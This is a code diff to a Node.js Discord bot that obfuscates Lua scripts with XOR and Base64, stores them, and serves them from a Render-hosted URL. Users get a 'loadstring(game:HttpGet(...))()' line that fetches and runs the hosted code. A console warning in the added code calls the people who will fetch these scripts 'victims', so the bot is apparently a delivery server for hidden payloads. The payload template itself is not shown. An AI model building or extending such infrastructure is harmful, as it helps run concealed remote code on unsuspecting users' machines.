@@ -10,7 +10,6 @@ require('dotenv').config();
 const STORE_FILE = path.join(__dirname, 'scripts.json');
 const SCRIPT_TTL = 24 * 60 * 60 * 1000; // 24 hours
 
-// Load existing scripts from disk
 let scripts = new Map();
 if (fs.existsSync(STORE_FILE)) {
     try {
@@ -27,13 +26,11 @@ if (fs.existsSync(STORE_FILE)) {
     }
 }
 
-// Save function
 function saveScripts() {
     const obj = Object.fromEntries(scripts);
     fs.writeFileSync(STORE_FILE, JSON.stringify(obj, null, 2));
 }
 
-// Clean expired and save periodically
 setInterval(() => {
     const now = Date.now();
     let changed = false;
@@ -66,16 +63,24 @@ app.get('/', (req, res) => res.send('Bot is alive!'));
 
 app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));
 
-// ----- Self‑ping (keep Render awake) -----
-const RENDER_URL = process.env.RENDER_URL;
-if (RENDER_URL) {
-    console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
-    setInterval(() => {
-        axios.get(RENDER_URL).catch(() => {});
-    }, 4 * 60 * 1000);
-    setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
+// ----- Determine public base URL -----
+// Render sets RENDER_EXTERNAL_URL automatically
+const BASE_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL || `http://localhost:${PORT}`;
+if (BASE_URL.includes('localhost')) {
+    console.warn('⚠️ WARNING: BASE_URL is localhost. Victims will not be able to fetch scripts. Set RENDER_EXTERNAL_URL or RENDER_URL environment variable.');
 } else {
-    console.log('⚠️ RENDER_URL not set – self‑ping disabled.');
+    console.log(`🌐 Public base URL: ${BASE_URL}`);
+}
+
+// ----- Self‑ping (keep Render awake) -----
+if (BASE_URL && !BASE_URL.includes('localhost')) {
+    console.log(`🔁 Self‑ping enabled: ${BASE_URL}`);
+    setInterval(() => {
+        axios.get(BASE_URL).catch(() => {});
+    }, 4 * 60 * 1000);
+    setTimeout(() => axios.get(BASE_URL).catch(() => {}), 5000);
+} else {
+    console.log('⚠️ Self‑ping disabled (no public URL).');
 }
 
 // ----- Discord Bot -----
@@ -121,7 +126,6 @@ client.on('interactionCreate', async interaction => {
     }
 
     try {
-        // ----- Read template -----
         const templatePath = path.join(__dirname, 'template.lua');
         if (!fs.existsSync(templatePath)) {
             return interaction.editReply({ 
@@ -143,9 +147,8 @@ client.on('interactionCreate', async interaction => {
         });
         saveScripts();
 
-        // ----- Build loadstring -----
-        const baseUrl = RENDER_URL || `http://localhost:${PORT}`;
-        const loadstringLine = `loadstring(game:HttpGet("${baseUrl}/script/${id}"))()`;
+        // ----- Build loadstring using the public BASE_URL -----
+        const loadstringLine = `loadstring(game:HttpGet("${BASE_URL}/script/${id}"))()`;
 
         // ----- Reply -----
         const embed = new EmbedBuilder()
@@ -173,9 +176,9 @@ client.on('interactionCreate', async interaction => {
 
         await interaction.editReply({ embeds: [embed] });
 
-        // ----- Self‑ping -----
-        if (RENDER_URL) {
-            axios.get(RENDER_URL).catch(() => {});
+        // ----- Self‑ping after command (optional) -----
+        if (BASE_URL && !BASE_URL.includes('localhost')) {
+            axios.get(BASE_URL).catch(() => {});
         }
 
     } catch (error) {
@@ -184,7 +187,7 @@ client.on('interactionCreate', async interaction => {
     }
 });
 
-// ----- Local obfuscator -----
+// ----- Local obfuscator (XOR + Base64) -----
 function obfuscateScript(raw) {
     const key = Math.floor(Math.random() * 254) + 1;
     let xorEncoded = '';
